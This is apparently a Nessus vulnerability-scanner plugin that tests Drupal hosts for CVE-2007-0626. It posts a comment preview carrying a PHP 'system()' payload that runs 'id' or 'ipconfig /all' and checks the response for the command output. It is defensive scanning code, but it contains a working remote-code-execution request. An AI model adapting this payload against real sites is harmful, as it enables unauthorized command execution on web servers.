#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(24266);
  script_version("$Revision: 1.27 $");
  script_cvs_date("$Date: 2017/05/16 19:35:39 $");

  script_cve_id("CVE-2007-0626");
  script_bugtraq_id(22306);
  script_osvdb_id(32136);

  script_name(english:"Drupal Comment Module comment_form_add_preview() Function Arbitrary Code Execution");
  script_summary(english:"Attempts to execute a command via Drupal.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Drupal running on the remote host fails to properly
validate previews on comments, and allows access to more than one
input filter, which is not enabled by default. An attacker can exploit
this issue by previewing a comment to have it interpreted as PHP code,
resulting in arbitrary code execution with the privileges of the web
server user id.");
  script_set_attribute(attribute:"see_also", value:"https://www.drupal.org/node/113935");
  script_set_attribute(attribute:"solution", value:"Upgrade to Drupal version 4.7.6 / 5.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20);

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/01/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2007/01/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/02/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:drupal:drupal");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2017 Tenable Network Security, Inc.");

  script_dependencies("drupal_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Drupal", "www/PHP");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "Drupal";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(qs:dir, port:port);

# First we need a posting id.
r = http_send_recv3(
  method : "GET",
  item   : dir + "/index.php",
  port   : port,
  exit_on_fail : TRUE
);

pat = '<a href="(' + dir + '/\\?q=|' + dir + '/)?comment/reply/([0-9]+)';
matches = egrep(pattern:pat, string: r[2]);
pid = NULL;
if (matches)
{
  foreach match (split(matches))
  {
    match = chomp(match);
    subpats = eregmatch(pattern:pat, string:match);
    if (!isnull(subpats))
    {
      pid = subpats[2];
      break;
    }
  }
}

# If we have one...
if (!isnull(pid))
{
  # Pull up the form.
  url = dir + "/?q=comment/reply/" + pid + "#comment_form";
  r = http_send_recv3(port:port, method: "GET", item: url, exit_on_fail: TRUE);

  # Grab the form token.
  pat = 'name="edit[form_token]"[^>]* value="([^"]+)"';
  matches = egrep(pattern:pat, string: r[2]);
  token = NULL;
  if (matches)
  {
    foreach match (split(matches))
    {
      match = chomp(match);
      subpats = eregmatch(pattern:pat, string:match);
      if (!isnull(subpats))
      {
        token = subpats[1];
        break;
      }
    }
  }
  if (isnull(token)) token = "e7a9fc015e16fc6d493bf1692b7c28e8";

  # Make sure multiple input filters are allowed but PHP code is not.
  if (
    (' name="edit[format]" value="' >< r[2] ||
     'name="format" value="' >< r[2]) &&
    # nb: this string is hard-coded in filter.module and appears
    #     regardless of the filter name as long as PHP code is
    #     supported by the filter.
    "You may post PHP code." >!< r[2]
  )
  {
    subject = (SCRIPT_NAME - ".nasl") + "-" + unixtime();
    # Determine which command to execute on target host
    os = get_kb_item("Host/OS");
    if (os && report_paranoia < 2)
    {
      if ("Windows" >< os) cmd = 'ipconfig /all';
      else cmd = 'id';

      cmds = make_list(cmd);
    }
    else cmds = make_list('id', 'ipconfig /all');

    cmd_pats = make_array();
    cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
    cmd_pats['ipconfig /all'] = "Subnet Mask|IP(v(4|6)?)? Address";

    foreach cmd (cmds)
    {
      # Drupal 4.x
      if (' name="edit[format]" value="' >< r[2])
      {
        postdata =
          "edit[subject]=" + subject + "&"+
          "edit[comment]=" + urlencode(str:"<?php system("+cmd+"); ?>") + "&" +
          # nb: 2 => evaluate as PHP code.
          "edit[format]=2&" +
          "edit[form_token]=" + token + "&" +
          "edit[form_id]=comment_form&" +
          "op=Preview+comment";
      }
      # Drupal 5.x
      else
      {
        postdata =
          "subject=" + subject + "&"+
          "comment=" + urlencode(str:"<?php system('"+cmd+"'); ?>") + "&" +
          # nb: 2 => evaluate as PHP code.
          "format=2&" +
          "form_token=" + token + "&" +
          "form_id=comment_form&" +
          "op=Preview+comment";
      }
      r = http_send_recv3(
        port   : port,
        method : "POST",
        item   : url,
        data   : postdata,
        content_type : "application/x-www-form-urlencoded",
        exit_on_fail : TRUE
      );

      # There's a problem if we see the code in the output.
      line = egrep(pattern:cmd_pats[cmd], string:r[2]);
      if (line)
      {
        vuln = TRUE;
        line = strstr(r[2], line);
      }
      if (vuln) break;
    }
  }
  else if ("You may post PHP code." >< r[2])
    exit(0, "PHP code in comments is already supported on the " + app + " install at " + install_url); 
}
if (vuln)
{
  if (cmd == 'id') line_limit = 2;
  else line_limit = 5;

  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    cmd         : cmd,
    line_limit  : line_limit,
    request     : make_list(http_last_sent_request()),
    output      : chomp(line)
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
